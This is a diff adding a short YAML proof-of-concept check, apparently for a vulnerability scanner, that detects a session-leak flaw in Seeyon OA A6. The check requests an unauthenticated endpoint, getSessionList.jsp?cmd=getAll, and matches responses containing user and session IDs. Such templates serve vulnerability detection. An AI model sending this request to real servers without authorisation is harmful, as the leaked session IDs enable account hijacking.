@@ -1,0 +1,17 @@
+id: poc-yaml-seeyon-oa-a6-sessions-leak
+info:
+  name: 致远 OA A6 会话泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: Seeyon
+  osprey-id: vb_2022_0091
+requests:
+- method: GET
+  path: /yyoa/ext/https/getSessionList.jsp?cmd=getAll
+  expression: 'contains(body, "<SessionList>") && contains(body, "<usrID>") && contains(body,
+    "<sessionID>")
+
+    '
+variables: {}
+transport: http
